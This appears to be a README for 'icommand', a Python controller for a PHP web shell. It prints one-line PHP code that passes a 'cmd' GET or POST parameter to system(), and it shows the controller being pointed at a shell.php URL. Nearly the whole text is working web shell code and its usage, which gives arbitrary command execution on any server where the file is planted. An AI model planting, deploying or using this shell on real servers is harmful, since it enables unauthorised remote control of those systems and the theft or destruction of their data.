### icommand - command controller for PHP system function
- - -   
- icommand works for **POST** and **GET** requests:   

	<pre><code><?php 
		system($_GET['cmd']);
	?></pre></code>
> `<?php system($_POST['cmd']); ?>`

# Usage  
- Using icommand with GET request is pretty easy:  
> python icommand.py http://testserver.com/shell.php?cmd=  
